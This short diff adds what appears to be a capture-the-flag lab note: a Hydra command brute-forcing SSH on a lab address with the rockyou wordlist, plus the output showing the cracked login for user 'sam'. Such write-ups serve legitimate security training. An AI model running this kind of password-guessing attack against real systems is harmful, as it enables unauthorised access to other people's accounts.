@@ -1,0 +1,12 @@
+hydra -s 4567 -l sam -P /usr/share/wordlists/rockyou.txt -t 4 10.10.173.195 -t 4 ssh  
+
+```
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-27 01:08:41
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
+[DATA] attacking ssh://10.10.173.195:4567/
+[4567][ssh] host: 10.10.173.195   login: sam   password: chocolate
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-27 01:09:38
+```
